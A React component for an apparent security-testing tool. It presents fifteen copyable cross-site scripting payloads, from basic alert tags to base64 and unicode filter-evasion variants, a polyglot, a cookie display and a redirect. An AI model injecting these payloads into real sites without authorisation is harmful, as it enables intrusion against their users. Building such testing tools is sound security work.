
import React, { useState } from 'react';
import { Copy, Eye, EyeOff, Code, Zap } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Textarea } from '@/components/ui/textarea';
import { useToast } from '@/hooks/use-toast';

interface XSSPayload {
  id: number;
  name: string;
  description: string;
  payload: string;
  category: 'basic' | 'advanced' | 'evasion' | 'polyglot';
  difficulty: 'Beginner' | 'Intermediate' | 'Advanced' | 'Expert';
}

const XSSPayloads = () => {
  const { toast } = useToast();
  const [editablePayloads, setEditablePayloads] = useState<{[key: number]: string}>({});
  const [showPayload, setShowPayload] = useState<{[key: number]: boolean}>({});

  const payloads: XSSPayload[] = [
    {
      id: 1,
      name: "Basic Alert",
      description: "Simple JavaScript alert box - classic XSS test",
      payload: `<script>alert('XSS Vulnerability Found!')</script>`,
      category: 'basic',
      difficulty: 'Beginner'
    },
    {
      id: 2,
      name: "Document Cookie Theft",
      description: "Steals and displays user cookies",
      payload: `<script>alert('Cookies: ' + document.cookie)</script>`,
      category: 'basic',
      difficulty: 'Beginner'
    },
    {
      id: 3,
      name: "Redirect Attack",
      description: "Redirects user to malicious site",
      payload: `<script>window.location='https://example.com/malicious'</script>`,
      category: 'basic',
      difficulty: 'Beginner'
    },
    {
      id: 4,
      name: "HTML Injection",
      description: "Injects HTML content without script tags",
      payload: `<img src=x onerror="alert('HTML Injection Successful')">`,
      category: 'basic',
      difficulty: 'Beginner'
    },
    {
      id: 5,
      name: "SVG Vector",
      description: "Uses SVG elements for XSS execution",
      payload: `<svg onload="alert('SVG XSS')"></svg>`,
      category: 'advanced',
      difficulty: 'Intermediate'
    },
    {
      id: 6,
      name: "Event Handler",
      description: "Uses various HTML event handlers",
      payload: `<body onload="alert('Event Handler XSS')">`,
      category: 'advanced',
      difficulty: 'Intermediate'
    },
    {
      id: 7,
      name: "JavaScript Protocol",
      description: "Uses javascript: protocol in URLs",
      payload: `<a href="javascript:alert('Protocol XSS')">Click me</a>`,
      category: 'advanced',
      difficulty: 'Intermediate'
    },
    {
      id: 8,
      name: "Base64 Encoded",
      description: "Base64 encoded payload to bypass filters",
      payload: `<script>eval(atob('YWxlcnQoJ0Jhc2U2NCBYU1MnKQ=='))</script>`,
      category: 'evasion',
      difficulty: 'Advanced'
    },
    {
      id: 9,
      name: "String Concatenation",
      description: "Breaks up keywords to evade detection",
      payload: `<script>ale\u0072t('Evasion XSS')</script>`,
      category: 'evasion',
      difficulty: 'Advanced'
    },
    {
      id: 10,
      name: "CSS Expression",
      description: "Uses CSS expressions (IE specific)",
      payload: `<div style="background:url('javascript:alert(1)')">`,
      category: 'evasion',
      difficulty: 'Advanced'
    },
    {
      id: 11,
      name: "DOM Based XSS",
      description: "Exploits DOM manipulation vulnerabilities",
      payload: `<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>`,
      category: 'advanced',
      difficulty: 'Advanced'
    },
    {
      id: 12,
      name: "Polyglot XSS",
      description: "Works in multiple contexts (HTML, JS, CSS)",
      payload: `jaVasCript:/*-/*\`/*\\\`/*'/*"/**/(/* */onerror=alert('Polyglot') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(//XSS//)//`,
      category: 'polyglot',
      difficulty: 'Expert'
    },
    {
      id: 13,
      name: "Template Literal",
      description: "Uses ES6 template literals for execution",
      payload: `<script>\`\${alert('Template XSS')}\`</script>`,
      category: 'advanced',
      difficulty: 'Advanced'
    },
    {
      id: 14,
      name: "Data URI XSS",
      description: "Uses data URIs to execute JavaScript",
      payload: `<iframe src="data:text/html,<script>alert('Data URI XSS')</script>"></iframe>`,
      category: 'evasion',
      difficulty: 'Advanced'
    },
    {
      id: 15,
      name: "Web Workers XSS",
      description: "Advanced XSS using Web Workers",
      payload: `<script>
var blob = new Blob(['onmessage=function(e){postMessage("XSS via Web Worker")}'], {type: 'application/javascript'});
var worker = new Worker(URL.createObjectURL(blob));
worker.onmessage = function(e) { alert(e.data); };
worker.postMessage('start');
</script>`,
      category: 'polyglot',
      difficulty: 'Expert'
    }
  ];

  const copyToClipboard = (text: string, payloadName: string) => {
    navigator.clipboard.writeText(text).then(() => {
      toast({
        title: "Copied to clipboard",
        description: `${payloadName} payload copied successfully`,
      });
    });
  };

  const togglePayloadVisibility = (id: number) => {
    setShowPayload(prev => ({ ...prev, [id]: !prev[id] }));
  };

  const updatePayload = (id: number, newPayload: string) => {
    setEditablePayloads(prev => ({ ...prev, [id]: newPayload }));
  };

  const getCurrentPayload = (payload: XSSPayload) => {
    return editablePayloads[payload.id] || payload.payload;
  };

  const getCategoryColor = (category: string) => {
    switch (category) {
      case 'basic': return 'text-green-400 bg-green-400/10 border-green-400/20';
      case 'advanced': return 'text-blue-400 bg-blue-400/10 border-blue-400/20';
      case 'evasion': return 'text-yellow-400 bg-yellow-400/10 border-yellow-400/20';
      case 'polyglot': return 'text-red-400 bg-red-400/10 border-red-400/20';
      default: return 'text-gray-400 bg-gray-400/10 border-gray-400/20';
    }
  };

  const getDifficultyColor = (difficulty: string) => {
    switch (difficulty) {
      case 'Beginner': return 'text-green-300';
      case 'Intermediate': return 'text-yellow-300';
      case 'Advanced': return 'text-orange-300';
      case 'Expert': return 'text-red-300';
      default: return 'text-gray-300';
    }
  };

  return (
    <div className="space-y-6">
      <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
        {payloads.map((payload) => (
          <Card key={payload.id} className="bg-gray-900/50 border-gray-700 hover:border-cyan-500/50 transition-all duration-300">
            <CardHeader className="pb-3">
              <div className="flex items-center justify-between">
                <CardTitle className="text-lg font-semibold text-white flex items-center">
                  <Zap className="h-4 w-4 mr-2 text-cyan-400" />
                  {payload.name}
                </CardTitle>
                <div className={`text-xs px-2 py-1 rounded border ${getCategoryColor(payload.category)}`}>
                  {payload.category.toUpperCase()}
                </div>
              </div>
              <div className="flex items-center justify-between">
                <CardDescription className="text-gray-300 text-sm">
                  {payload.description}
                </CardDescription>
                <span className={`text-xs font-medium ${getDifficultyColor(payload.difficulty)}`}>
                  {payload.difficulty}
                </span>
              </div>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="relative">
                <Textarea
                  value={getCurrentPayload(payload)}
                  onChange={(e) => updatePayload(payload.id, e.target.value)}
                  className="bg-black/50 border-gray-600 text-cyan-100 font-mono text-sm min-h-[100px] resize-none"
                  placeholder="XSS Payload..."
                />
                <Button
                  size="sm"
                  variant="ghost"
                  className="absolute top-2 right-2 h-8 w-8 p-0 hover:bg-gray-700"
                  onClick={() => togglePayloadVisibility(payload.id)}
                >
                  {showPayload[payload.id] ? (
                    <EyeOff className="h-4 w-4 text-gray-400" />
                  ) : (
                    <Eye className="h-4 w-4 text-gray-400" />
                  )}
                </Button>
              </div>
              
              <div className="flex gap-2">
                <Button
                  onClick={() => copyToClipboard(getCurrentPayload(payload), payload.name)}
                  className="flex-1 bg-cyan-600 hover:bg-cyan-700 text-white"
                  size="sm"
                >
                  <Copy className="h-4 w-4 mr-2" />
                  Copy Payload
                </Button>
                <Button
                  onClick={() => updatePayload(payload.id, payload.payload)}
                  variant="outline"
                  className="border-gray-600 text-gray-300 hover:bg-gray-700"
                  size="sm"
                >
                  Reset
                </Button>
              </div>
            </CardContent>
          </Card>
        ))}
      </div>
    </div>
  );
};

export default XSSPayloads;
